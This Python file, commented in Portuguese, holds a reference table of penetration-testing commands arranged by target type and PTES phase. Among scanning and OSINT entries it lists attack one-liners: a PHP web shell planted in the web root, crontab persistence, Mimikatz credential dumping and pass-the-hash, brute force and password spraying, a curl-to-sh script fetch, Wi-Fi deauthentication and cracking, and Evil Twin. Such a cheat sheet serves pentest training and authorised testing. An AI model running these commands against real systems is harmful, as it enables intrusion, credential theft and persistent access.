# Base de referencia de ferramentas/comandos por tipo de alvo e fase PTES.
# Dado estatico (nao sensivel) usado apenas como guia - nao contem dados de alvos.

TOOLS_DB: dict[str, dict[int, list[dict]]] = {
    "host": {
        0: [
            {"name": "Shodan", "tag": "OSINT", "commands": [
                {"label": "Host lookup", "command": "shodan host {TARGET}", "desc": "Portas e serviços expostos via Shodan"},
                {"label": "Histórico", "command": "shodan host {TARGET} --history", "desc": "Histórico de mudanças do host"},
            ]},
            {"name": "Censys", "tag": "OSINT", "commands": [
                {"label": "Search host", "command": 'censys search "{TARGET}" --index-type hosts', "desc": "Dados do host no Censys"},
            ]},
            {"name": "whois / DNS", "commands": [
                {"label": "Reverse DNS", "command": "dig -x {TARGET}", "desc": "Resolve IP para hostname"},
                {"label": "Whois IP", "command": "whois {TARGET}", "desc": "Informações do bloco IP"},
            ]},
        ],
        1: [
            {"name": "nmap", "tag": "Scanner", "commands": [
                {"label": "Quick scan", "command": "nmap -sV -sC -oN scan_quick.txt {TARGET}", "desc": "Top 1000 portas com versão e scripts"},
                {"label": "Full TCP", "command": "nmap -sV -sC -p- -oN scan_full.txt {TARGET}", "desc": "Todas as 65535 portas"},
                {"label": "UDP top 100", "command": "sudo nmap -sU --top-ports 100 -oN scan_udp.txt {TARGET}", "desc": "Scan UDP nas portas mais comuns"},
                {"label": "Stealth SYN", "command": "sudo nmap -sS -T2 -f --data-length 24 -oN stealth.txt {TARGET}", "desc": "Scan furtivo com fragmentação"},
                {"label": "OS detection", "command": "sudo nmap -O -sV --version-intensity 5 {TARGET}", "desc": "Detecção de sistema operacional"},
            ]},
            {"name": "enum4linux", "tag": "SMB", "commands": [
                {"label": "Full enum", "command": "enum4linux -a {TARGET}", "desc": "Enumeração completa de SMB/NetBIOS"},
            ]},
            {"name": "smbclient", "tag": "SMB", "commands": [
                {"label": "List shares", "command": "smbclient -L //{TARGET} -N", "desc": "Listar compartilhamentos sem autenticação"},
            ]},
        ],
        2: [
            {"name": "Nessus / OpenVAS", "commands": [
                {"label": "OpenVAS scan", "command": 'gvm-cli --gmp-username admin --gmp-password admin socket --xml "<create_task>...</create_task>"', "desc": "Iniciar scan de vulnerabilidades"},
            ]},
            {"name": "nmap NSE", "tag": "Vuln", "commands": [
                {"label": "Vuln scripts", "command": "nmap --script vuln -p {PORTS} -oN vuln_scan.txt {TARGET}", "desc": "NSE scripts de vulnerabilidades"},
                {"label": "SMB vulns", "command": "nmap --script smb-vuln* -p 445 {TARGET}", "desc": "Verificar EternalBlue, MS17-010, etc."},
            ]},
        ],
        3: [
            {"name": "Metasploit", "tag": "Framework", "commands": [
                {"label": "Search exploit", "command": 'msfconsole -q -x "search type:exploit {SERVICE}; exit"', "desc": "Buscar exploits para o serviço"},
                {"label": "Run exploit", "command": 'msfconsole -q -x "use {EXPLOIT}; set RHOSTS {TARGET}; set LHOST {LHOST}; run"', "desc": "Executar exploit"},
            ]},
            {"name": "Hydra", "tag": "Brute", "commands": [
                {"label": "SSH brute", "command": "hydra -L users.txt -P pass.txt ssh://{TARGET} -t 4", "desc": "Bruteforce SSH"},
                {"label": "FTP brute", "command": "hydra -L users.txt -P pass.txt ftp://{TARGET}", "desc": "Bruteforce FTP"},
            ]},
            {"name": "CrackMapExec", "tag": "AD", "commands": [
                {"label": "SMB spray", "command": "crackmapexec smb {TARGET} -u users.txt -p pass.txt", "desc": "Password spray via SMB"},
            ]},
        ],
        4: [
            {"name": "LinPEAS / WinPEAS", "tag": "PrivEsc", "commands": [
                {"label": "LinPEAS", "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee linpeas.txt", "desc": "Enumeração de privesc Linux"},
                {"label": "WinPEAS", "command": ".\\winpeas.exe | Tee-Object winpeas.txt", "desc": "Enumeração de privesc Windows"},
            ]},
            {"name": "Mimikatz", "tag": "Creds", "commands": [
                {"label": "Dump creds", "command": 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"', "desc": "Dump de credenciais em memória"},
                {"label": "Pass-the-hash", "command": 'mimikatz.exe "sekurlsa::pth /user:{USER} /ntlm:{HASH} /domain:{DOMAIN}" "exit"', "desc": "Pass-the-hash attack"},
            ]},
            {"name": "Persistence", "commands": [
                {"label": "Crontab", "command": 'echo "*/5 * * * * /tmp/shell.sh" | crontab -', "desc": "Persistência via crontab (Linux)"},
            ]},
        ],
    },
    "domain": {
        0: [
            {"name": "whois / DNS", "commands": [
                {"label": "Whois", "command": "whois {TARGET}", "desc": "Registro do domínio"},
                {"label": "All DNS records", "command": "dig {TARGET} ANY +noall +answer", "desc": "Todos os registros DNS"},
                {"label": "Zone transfer", "command": "dig axfr @ns1.{TARGET} {TARGET}", "desc": "Tentar transferência de zona"},
                {"label": "Subdomains (crt.sh)", "command": 'curl -s "https://crt.sh/?q=%25.{TARGET}&output=json" | jq -r ".[].name_value" | sort -u', "desc": "Subdomínios via certificados SSL"},
            ]},
            {"name": "theHarvester", "tag": "OSINT", "commands": [
                {"label": "Full harvest", "command": "theHarvester -d {TARGET} -b all -l 500", "desc": "Emails, hosts e subdomínios de fontes públicas"},
            ]},
            {"name": "Wayback Machine", "tag": "OSINT", "commands": [
                {"label": "URLs históricas", "command": "waybackurls {TARGET} | sort -u > wayback_urls.txt", "desc": "URLs arquivadas no Wayback Machine"},
            ]},
        ],
        1: [
            {"name": "nmap", "tag": "Scanner", "commands": [
                {"label": "Web ports", "command": "nmap -sV -sC -p 80,443,8080,8443 -oN web_scan.txt {TARGET}", "desc": "Scan focado em portas web"},
                {"label": "Full scan", "command": "nmap -sV -sC -p- -oN full_scan.txt {TARGET}", "desc": "Scan completo"},
            ]},
            {"name": "gobuster", "tag": "Discovery", "commands": [
                {"label": "Dir bruteforce", "command": "gobuster dir -u https://{TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirs.txt -k", "desc": "Bruteforce de diretórios"},
                {"label": "Vhost enum", "command": "gobuster vhost -u https://{TARGET} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "desc": "Enumeração de virtual hosts"},
            ]},
            {"name": "amass", "tag": "Subdomains", "commands": [
                {"label": "Passive", "command": "amass enum -passive -d {TARGET} -o amass_passive.txt", "desc": "Subdomínios passivo"},
                {"label": "Active + brute", "command": "amass enum -active -d {TARGET} -brute -o amass_active.txt", "desc": "Ativo com bruteforce"},
            ]},
            {"name": "whatweb", "tag": "Fingerprint", "commands": [
                {"label": "Tech stack", "command": "whatweb -a 3 https://{TARGET}", "desc": "Detectar tecnologias do site"},
            ]},
        ],
        2: [
            {"name": "Nuclei", "tag": "Scanner", "commands": [
                {"label": "Full scan", "command": "nuclei -u https://{TARGET} -o nuclei.txt", "desc": "Scan com todos os templates"},
                {"label": "Critical/High", "command": "nuclei -u https://{TARGET} -s critical,high -o nuclei_crit.txt", "desc": "Apenas critical e high"},
                {"label": "CVEs only", "command": "nuclei -u https://{TARGET} -t cves/ -o nuclei_cves.txt", "desc": "Apenas CVEs conhecidos"},
            ]},
            {"name": "Nikto", "commands": [
                {"label": "Web scan", "command": "nikto -h https://{TARGET} -o nikto.html -Format htm", "desc": "Scanner de vulns web"},
            ]},
            {"name": "SQLMap", "tag": "Injection", "commands": [
                {"label": "GET param", "command": 'sqlmap -u "https://{TARGET}/page?id=1" --batch --dbs', "desc": "SQL injection em GET"},
                {"label": "POST form", "command": 'sqlmap -u "https://{TARGET}/login" --data="user=a&pass=a" --batch', "desc": "SQL injection em POST"},
                {"label": "Cookie-based", "command": 'sqlmap -u "https://{TARGET}/dashboard" --cookie="session=abc" --batch --dbs', "desc": "SQL injection via cookie"},
            ]},
            {"name": "XSStrike", "tag": "XSS", "commands": [
                {"label": "XSS scan", "command": 'xsstrike -u "https://{TARGET}/search?q=test"', "desc": "Detecção de XSS"},
            ]},
        ],
        3: [
            {"name": "Metasploit", "tag": "Framework", "commands": [
                {"label": "Web exploits", "command": 'msfconsole -q -x "search type:exploit platform:php; exit"', "desc": "Exploits para web apps"},
            ]},
            {"name": "Hydra", "tag": "Brute", "commands": [
                {"label": "HTTP POST login", "command": 'hydra -L users.txt -P pass.txt {TARGET} http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"', "desc": "Brute em form login"},
            ]},
            {"name": "Burp Suite", "commands": [
                {"label": "Intruder (manual)", "command": "# Configure Burp Intruder:\n# Target: https://{TARGET}\n# Position: payload markers\n# Attack: Sniper/Cluster Bomb", "desc": "Ataques automatizados via Burp"},
            ]},
        ],
        4: [
            {"name": "Web Shell", "tag": "Persist", "commands": [
                {"label": "PHP shell", "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/.shell.php", "desc": "Web shell simples (PHP)"},
            ]},
            {"name": "Pivoting", "commands": [
                {"label": "SSH tunnel", "command": "ssh -D 9050 -N user@{TARGET}", "desc": "SOCKS proxy via SSH"},
                {"label": "Chisel", "command": "./chisel server -p 8080 --reverse & ./chisel client {TARGET}:8080 R:socks", "desc": "Tunnel com Chisel"},
            ]},
        ],
    },
    "person": {
        0: [
            {"name": "OSINT Framework", "tag": "OSINT", "commands": [
                {"label": "Sherlock", "command": "sherlock {TARGET} --timeout 10", "desc": "Buscar username em redes sociais"},
                {"label": "holehe", "command": "holehe {TARGET}@gmail.com", "desc": "Verificar cadastros de email"},
            ]},
            {"name": "Google Dorks", "tag": "OSINT", "commands": [
                {"label": "Name search", "command": '# Google: "{TARGET}" site:linkedin.com OR site:github.com', "desc": "Dorks para encontrar perfis"},
                {"label": "Email search", "command": '# Google: "{TARGET}" "@gmail.com" OR "@outlook.com"', "desc": "Encontrar emails associados"},
                {"label": "Documents", "command": '# Google: "{TARGET}" filetype:pdf OR filetype:doc', "desc": "Documentos públicos"},
            ]},
            {"name": "Maltego", "tag": "Graph", "commands": [
                {"label": "Person transform", "command": "# Maltego: New Graph > Person Entity > Run All Transforms", "desc": "Análise visual de conexões"},
            ]},
        ],
        1: [
            {"name": "Recon-ng", "tag": "Framework", "commands": [
                {"label": "People module", "command": "recon-ng -m recon/contacts-contacts/mailtester\nset SOURCE {TARGET}", "desc": "Módulos de recon sobre pessoas"},
            ]},
            {"name": "SpiderFoot", "tag": "OSINT", "commands": [
                {"label": "Full scan", "command": 'spiderfoot -s "{TARGET}" -t HUMAN_NAME -o json > spiderfoot.json', "desc": "OSINT automatizado sobre pessoa"},
            ]},
        ],
    },
    "network": {
        0: [
            {"name": "whois / DNS", "commands": [
                {"label": "CIDR whois", "command": 'whois -h whois.radb.net -- "-i origin {TARGET}"', "desc": "Info do bloco de IP"},
                {"label": "BGP lookup", "command": "whois -h whois.bgpview.io {TARGET}", "desc": "Informações BGP"},
            ]},
        ],
        1: [
            {"name": "nmap", "tag": "Scanner", "commands": [
                {"label": "Host discovery", "command": "nmap -sn {TARGET} -oN hosts_alive.txt", "desc": "Descobrir hosts ativos na rede"},
                {"label": "Quick scan rede", "command": "nmap -sV --top-ports 20 {TARGET} -oN net_quick.txt", "desc": "Top 20 portas em todos os hosts"},
                {"label": "Full network scan", "command": "nmap -sV -sC -p- {TARGET} -oN net_full.txt --open", "desc": "Scan completo da rede"},
            ]},
            {"name": "masscan", "tag": "Speed", "commands": [
                {"label": "Fast scan", "command": "masscan {TARGET} -p1-65535 --rate=1000 -oL masscan.txt", "desc": "Scan ultra-rápido de portas"},
            ]},
            {"name": "Responder", "tag": "MITM", "commands": [
                {"label": "Listen", "command": "sudo responder -I eth0 -wrf", "desc": "Capturar hashes NTLMv2 na rede"},
            ]},
        ],
        2: [
            {"name": "nmap NSE", "tag": "Vuln", "commands": [
                {"label": "Vuln scan rede", "command": "nmap --script vuln {TARGET} -oN net_vuln.txt", "desc": "Scripts de vulnerabilidade na rede"},
            ]},
            {"name": "CrackMapExec", "tag": "AD", "commands": [
                {"label": "SMB scan", "command": "crackmapexec smb {TARGET}", "desc": "Enum de hosts SMB na rede"},
            ]},
        ],
    },
    "api": {
        0: [
            {"name": "API Discovery", "tag": "OSINT", "commands": [
                {"label": "Swagger/OpenAPI", "command": "curl -s https://{TARGET}/swagger.json | jq .", "desc": "Buscar especificação OpenAPI"},
                {"label": "Common endpoints", "command": "curl -s https://{TARGET}/api/v1/ && curl -s https://{TARGET}/.well-known/openid-configuration", "desc": "Endpoints comuns"},
            ]},
            {"name": "Google Dorks", "tag": "OSINT", "commands": [
                {"label": "API docs", "command": "# Google: site:{TARGET} inurl:api OR inurl:swagger OR inurl:graphql", "desc": "Buscar documentação pública"},
            ]},
        ],
        1: [
            {"name": "ffuf", "tag": "Fuzzing", "commands": [
                {"label": "Endpoint fuzz", "command": "ffuf -u https://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,301,403", "desc": "Fuzzing de endpoints API"},
                {"label": "Parameter fuzz", "command": 'ffuf -u "https://{TARGET}/api/v1/users?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200', "desc": "Fuzzing de parâmetros"},
            ]},
            {"name": "Postman / curl", "commands": [
                {"label": "Auth bypass", "command": 'curl -X GET https://{TARGET}/api/admin -H "Authorization: Bearer invalid" -v', "desc": "Testar bypass de autenticação"},
                {"label": "IDOR test", "command": 'curl -X GET https://{TARGET}/api/users/2 -H "Authorization: Bearer {TOKEN}" -v', "desc": "Testar IDOR"},
            ]},
        ],
        2: [
            {"name": "Nuclei", "tag": "Scanner", "commands": [
                {"label": "API templates", "command": "nuclei -u https://{TARGET} -t http/vulnerabilities/ -o api_nuclei.txt", "desc": "Templates de vulnerabilidades HTTP"},
            ]},
            {"name": "SQLMap", "tag": "Injection", "commands": [
                {"label": "API injection", "command": 'sqlmap -u "https://{TARGET}/api/search?q=1" --batch --dbs --headers="Authorization: Bearer {TOKEN}"', "desc": "SQLi em endpoint API"},
            ]},
            {"name": "JWT", "tag": "Auth", "commands": [
                {"label": "JWT crack", "command": "john jwt_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256", "desc": "Crack de JWT secret"},
                {"label": "jwt_tool", "command": "python3 jwt_tool.py {JWT_TOKEN} -C -d /usr/share/wordlists/rockyou.txt", "desc": "Análise e crack de JWT"},
            ]},
        ],
        3: [
            {"name": "Burp Suite", "commands": [
                {"label": "Intruder API", "command": "# Burp > Intruder:\n# Target: https://{TARGET}/api\n# Configure payloads para IDOR, auth bypass, mass assignment", "desc": "Ataques automatizados na API"},
            ]},
        ],
    },
    "cloud": {
        0: [
            {"name": "Cloud Recon", "tag": "OSINT", "commands": [
                {"label": "S3 buckets", "command": "python3 cloud_enum.py -k {TARGET} --disable-azure --disable-gcp", "desc": "Buscar buckets S3 expostos"},
                {"label": "Azure blobs", "command": "python3 cloud_enum.py -k {TARGET} --disable-aws --disable-gcp", "desc": "Buscar blobs Azure expostos"},
            ]},
            {"name": "DNS enum", "commands": [
                {"label": "Cloud endpoints", "command": "dig {TARGET}.s3.amazonaws.com && dig {TARGET}.blob.core.windows.net", "desc": "Verificar endpoints cloud"},
            ]},
        ],
        1: [
            {"name": "ScoutSuite", "tag": "Audit", "commands": [
                {"label": "AWS audit", "command": "scout aws --report-dir ./scout_report", "desc": "Auditoria de configuração AWS"},
                {"label": "Azure audit", "command": "scout azure --report-dir ./scout_report", "desc": "Auditoria de configuração Azure"},
            ]},
            {"name": "Prowler", "tag": "AWS", "commands": [
                {"label": "Full check", "command": "prowler aws --output-formats json-asff html", "desc": "Verificação completa de segurança AWS"},
            ]},
        ],
        2: [
            {"name": "Pacu", "tag": "AWS Exploit", "commands": [
                {"label": "Enum all", "command": "pacu --session {TARGET}\nrun iam__enum_permissions\nrun ec2__enum", "desc": "Enumeração de permissões AWS"},
            ]},
            {"name": "CloudSploit", "commands": [
                {"label": "Scan", "command": "cloudsploit scan --cloud aws --config config.js", "desc": "Scan de vulnerabilidades cloud"},
            ]},
        ],
    },
    "mobile": {
        0: [
            {"name": "App Store OSINT", "commands": [
                {"label": "APK download", "command": "apkeep -a {TARGET} .", "desc": "Download do APK da Play Store"},
            ]},
            {"name": "MobSF", "tag": "Analysis", "commands": [
                {"label": "Static analysis", "command": "# Upload APK/IPA para MobSF: http://localhost:8000", "desc": "Análise estática do app"},
            ]},
        ],
        1: [
            {"name": "jadx", "tag": "Decompile", "commands": [
                {"label": "Decompile APK", "command": "jadx -d output/ {TARGET}.apk", "desc": "Decompilar APK para Java"},
            ]},
            {"name": "frida", "tag": "Dynamic", "commands": [
                {"label": "Hook function", "command": "frida -U -f {TARGET} -l hook.js --no-pause", "desc": "Instrumentação dinâmica"},
                {"label": "SSL unpin", "command": "frida -U -f {TARGET} -l ssl_unpin.js --no-pause", "desc": "Bypass de SSL pinning"},
            ]},
        ],
        2: [
            {"name": "Burp + Proxy", "commands": [
                {"label": "Setup proxy", "command": "# ADB: adb shell settings put global http_proxy {LHOST}:8080\n# Instalar cert Burp no device", "desc": "Configurar interceptação de tráfego"},
            ]},
            {"name": "Drozer", "tag": "Android", "commands": [
                {"label": "Attack surface", "command": "drozer console connect\nrun app.package.attacksurface {TARGET}", "desc": "Mapear superfície de ataque Android"},
            ]},
        ],
    },
    "wifi": {
        0: [
            {"name": "Reconnaissance", "commands": [
                {"label": "Monitor mode", "command": "sudo airmon-ng start wlan0", "desc": "Ativar modo monitor"},
                {"label": "Scan networks", "command": "sudo airodump-ng wlan0mon", "desc": "Listar redes Wi-Fi disponíveis"},
            ]},
        ],
        1: [
            {"name": "Aircrack-ng", "tag": "Wi-Fi", "commands": [
                {"label": "Capture handshake", "command": "sudo airodump-ng -c {CHANNEL} --bssid {BSSID} -w capture wlan0mon", "desc": "Capturar handshake WPA"},
                {"label": "Deauth", "command": "sudo aireplay-ng -0 5 -a {BSSID} wlan0mon", "desc": "Deautenticação para forçar handshake"},
                {"label": "Crack WPA", "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", "desc": "Crack de senha WPA"},
            ]},
            {"name": "Wireshark", "tag": "Capture", "commands": [
                {"label": "Capture traffic", "command": "tshark -i wlan0mon -w capture.pcap", "desc": "Capturar tráfego wireless"},
            ]},
        ],
        2: [
            {"name": "Wifite", "tag": "Auto", "commands": [
                {"label": "Auto attack", "command": "sudo wifite --kill", "desc": "Ataque automatizado a redes Wi-Fi"},
            ]},
            {"name": "Evil Twin", "commands": [
                {"label": "Fluxion", "command": "sudo fluxion", "desc": "Ataque Evil Twin automatizado"},
            ]},
        ],
    },
    "company": {
        0: [
            {"name": "OSINT Empresa", "tag": "OSINT", "commands": [
                {"label": "theHarvester", "command": "theHarvester -d {TARGET} -b all -l 500", "desc": "Emails, hosts e subdomínios"},
                {"label": "LinkedIn enum", "command": '# Google: site:linkedin.com "{TARGET}" employees', "desc": "Enumerar funcionários via LinkedIn"},
                {"label": "GitHub leaks", "command": '# GitHub: "{TARGET}" password OR secret OR api_key', "desc": "Buscar vazamentos no GitHub"},
            ]},
            {"name": "DNS / Domínios", "commands": [
                {"label": "Subdomains", "command": "subfinder -d {TARGET} -all -o subdomains.txt", "desc": "Descoberta massiva de subdomínios"},
                {"label": "ASN lookup", "command": 'whois -h whois.radb.net -- "-i origin $(whois {TARGET} | grep ASN)"', "desc": "Blocos IP da empresa"},
            ]},
            {"name": "Shodan", "tag": "OSINT", "commands": [
                {"label": "Org search", "command": 'shodan search "org:{TARGET}" --fields ip_str,port,org', "desc": "Dispositivos expostos da organização"},
            ]},
        ],
        1: [
            {"name": "nmap", "tag": "Scanner", "commands": [
                {"label": "Scan range", "command": "nmap -sV -sC --top-ports 1000 -oN corp_scan.txt {TARGET}", "desc": "Scan dos hosts da empresa"},
            ]},
            {"name": "amass", "tag": "Subdomains", "commands": [
                {"label": "Intel", "command": 'amass intel -org "{TARGET}" -o amass_intel.txt', "desc": "Descobrir domínios e ASNs da org"},
                {"label": "Enum", "command": "amass enum -active -d {TARGET} -brute -o amass_enum.txt", "desc": "Enumeração ativa de subdomínios"},
            ]},
        ],
        2: [
            {"name": "Nuclei", "tag": "Scanner", "commands": [
                {"label": "Mass scan", "command": "cat subdomains.txt | nuclei -o nuclei_mass.txt", "desc": "Scan de vuln em todos os subdomínios"},
            ]},
        ],
    },
}


def get_tools(target_type: str, phase_index: int) -> list[dict]:
    type_db = TOOLS_DB.get(target_type, TOOLS_DB["host"])
    return type_db.get(phase_index, [])


def get_tool_count(target_type: str, phase_index: int) -> int:
    return sum(len(group["commands"]) for group in get_tools(target_type, phase_index))
